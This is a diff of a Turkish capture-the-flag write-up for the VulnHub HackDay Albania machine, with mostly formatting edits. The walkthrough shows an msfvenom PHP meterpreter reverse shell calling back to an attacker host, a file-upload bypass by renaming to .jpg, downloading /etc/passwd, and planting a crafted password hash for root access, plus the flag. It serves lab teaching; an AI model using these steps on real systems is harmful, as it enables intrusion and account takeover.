@@ -18,15 +18,15 @@ indirme linkleri:
 [Torrent](https://download.vulnhub.com/hackday/HackDay-Albania.ova.torrent)
 
 
-__VM çözümü__
+__VM çözümü__  
 ```ifconfig ```  
 
-İle kendi IP adresimizi ve Subnet Mask'ımızı öğrenip(192.168.1.0/24 ağında bulunuyorum)   
+komutu ile kendi IP adresimizi ve Subnet Mask'ımızı öğrenip(192.168.1.0/24 ağında bulunuyorum)   
 
 ```nmap 192.168.1.1/24```  
 
-komutunu kullanarak içinde bulunduğumuz ağda bulunan diğer cihazları bulmak için nmap aracını 192.168.1.1/24 
-ağına yönelik normal tarama yapması için çalıştırıyoruz. Tarama sonucunda, 192.168.1.10 IP adresine sahip hedefimizin üzerinde;
+komutunu kullanarak içinde bulunduğumuz ağda bulunan diğer cihazları bulmak için nmap aracını **192.168.1.1/24** 
+ağına yönelik normal tarama yapması için çalıştırıyoruz. Tarama sonucunda, **192.168.1.10** IP adresine sahip hedefimizin üzerinde;
 22 TCP portunda SSH, 8008 TCP portunda bir HTTP servisinin açık olduğunu keşfediyoruz.
 
 
@@ -52,8 +52,8 @@ adresine gitmeyi deniyoruz. 8008 portunu belirtmek zorundayız çünkü HTTP
 varsayılan portu 80 dir ve browser 80 portunu deneyeceği için hata alacaktır.
 Siteye girdiğimizde bizi Elliot Alderson yani nam-ı diğer Mr.Robot
 karşılıyor ve bilmediğimiz bir dilde yazılmış birkaç satır. Bu satırları google translateden
-çevirince çok anlamlı çıkmasa da arnavutça yazılmış olduğunu anlıyoruz ve yazıda "nereye gideceğini
-bildiğini" ifade ediyor. Sayfa kodlarında da birşey bulamayınca, 
+çevirince çok anlamlı çıkmasa da arnavutça yazılmış olduğunu anlıyoruz ve yazıda **nereye gideceğini
+bildiğini** ifade ediyor. Sayfa kodlarında da birşey bulamayınca, 
 hemen adresi **[Owasp ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)** aracında tarattığımızda birşey gözümüze çarpıyor:
 
 ```robots.txt```   
@@ -118,13 +118,13 @@ ve 25000 euroluk hesabıyla bizi charles karşılıyor.
 ![]({{ AUCyberClub.github.io }}/assets/img/hackaday/07.png)   
 
 
-fakat gözümüz hala doymamış olacak ki sistem hedefinden şaşmayıp sağda duran "Contact Support"
+fakat gözümüz hala doymamış olacak ki sistem hedefinden şaşmayıp sağda duran **Contact Support**
 kısmında file selecti görünce kalbimiz çarpıyor. Tabi durmayıp
 
 ```msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > aucc.php```  
 
-ile 192.168.1.5 IP adresli Kali Linux makinemizin 4444 portuna yönlendiren
-bir php zararlı yazılımı, üretip onu da raw formatında "aucc.php" adında
+ile **192.168.1.5** IP adresli Kali Linux makinemizin 4444 portuna yönlendiren
+bir php zararlı yazılımı, üretip onu da raw formatında **aucc.php** adında
 bir dosyaya yazıyoruz ve metasploitimizi de resimdeki gibi hazırlayıp
 
 
@@ -132,7 +132,7 @@ bir dosyaya yazıyoruz ve metasploitimizi de resimdeki gibi hazırlayıp
 
 
 bizi renklerle kandıracağını düşünenlere de mesajımızı vererek
-"aucc.php" yi yüklemeye çalışıyoruz  
+**aucc.php** yi yüklemeye çalışıyoruz  
 
 
 ![]({{ AUCyberClub.github.io }}/assets/img/hackaday/09.png)  
@@ -144,7 +144,7 @@ fakat hacklendikten sonra artık sadece jpg ve türevi kabul ediyoruz diyerek bi
 ![]({{ AUCyberClub.github.io }}/assets/img/hackaday/10.png)  
 
 
-Biz de, al sana jpg diyip "aucc.php" nin adını "aucc.jpg" olarak olarak değiştirip
+Biz de, al sana jpg diyip **aucc.php** nin adını **aucc.jpg** olarak olarak değiştirip
 yepyeni bir sticker göndermesiyle yüklüyoruz. 
 
 
@@ -152,7 +152,7 @@ yepyeni bir sticker göndermesiyle yüklüyoruz.
 
 
 Ve dosyayı yedirmeyi başardık. Fakat msfconsole hala bekliyor yani bizim bu dosyayı açtırmamız lazım.
-bıraktığımız Ticket'ın üzerine tıklayıp, sistem "aucc.jpg" dosyasını açmaya çalışınca
+bıraktığımız Ticket'ın üzerine tıklayıp, sistem **aucc.jpg** dosyasını açmaya çalışınca
 msfconsole da bir hareketlilik baş gösteriyor ve meterpreter konsolundayız. Bana göre sahte kısmı burada
 başlıyor çünkü normal sistemlerde karşımıza kolay kolay çıkmayacak olan olayla burada karşılaştım.
 
@@ -163,19 +163,19 @@ bu olmadığından başaramadım. Fakat dediğim gibi karşımıza kolay kolay �
 
 ```/etc/passwd ```
 
-doaysının izinlerine baktığımızda write iznini farkediyoruz. Tabi "meterpreter" dan bunu editlemek biraz
+doaysının izinlerine baktığımızda write iznini farkediyoruz. Tabi **meterpreter** üzerinden bunu editlemek biraz
 sancılı olacağı için
 
 ```download /etc/passwd```
 
 ile Kali'ye hedef makinenin passwd dosyasını indiriyoruz. Eski linux sistemler şifreleri(hashlenmiş parolaları) de bu dosyada tutuyordu
-fakat daha sonra istismar edilebilirliği daha doğrusu "bruteforce" u engellemek adına şifreleri "/etc/shadow" a
-taşıyarak eskiden şifrelerin olduğu yere bir "x" bıraktılar ve bu yolla parola kontrolü için shadow a yönlendirme yaptılar.
+fakat daha sonra istismar edilebilirliği daha doğrusu "bruteforce" u engellemek adına şifreleri **/etc/shadow** a
+taşıyarak eskiden şifrelerin olduğu yere bir **x** bıraktılar ve bu yolla parola kontrolü için shadow a yönlendirme yaptılar.
 shadow un okuma iznide yalnız rootta olduğu için bence "şimdilik yeterince güvenli" bir işe imza attılar. Bu bilgiyi kullanarak
 
 ```openssl passwd -1 -salt tuzlu aucc```
 
-ile passwd formatında md5(-1) tipinde "tuzlu" ile saltlanmış yani bruteforce u zorlaştırmak adına önlem alınmış ve parola olarak 'aucc'nin 
+ile passwd formatında md5(-1) tipinde **tuzlu** ile saltlanmış yani bruteforce u zorlaştırmak adına önlem alınmış ve parola olarak 'aucc'nin 
 hashini üretiyoruz ve çıktı olarak :
 
 ```$1$tuzlu$LewyIW83SjgyBrkI29SWh0```  
@@ -198,7 +198,7 @@ ile bağlantımızı kurup parola olarak
 
 ```aucc```
 
-yazıyoruz ve içerdeyiz. Son olarak flagi "/root" dizininde bulup
+yazıyoruz ve içerdeyiz. Son olarak flagi **/root** dizininde bulup
 
 ![]({{ AUCyberClub.github.io }}/assets/img/hackaday/13.png)  
 
@@ -213,7 +213,8 @@ ile flag'i bastırıp flag'i gördüğümüze göre sanal makinemizde işimizi b
     Tani nis raportin!
 
     (arnavutça "tebrikler, şimdi rapor başlıyor!" yazıyor ve flagi veriyor)
-    **d5ed38fdbf28bc4e58be142cf5a17cf5** ```
+    ```  
+    **d5ed38fdbf28bc4e58be142cf5a17cf5** 
     
     
       
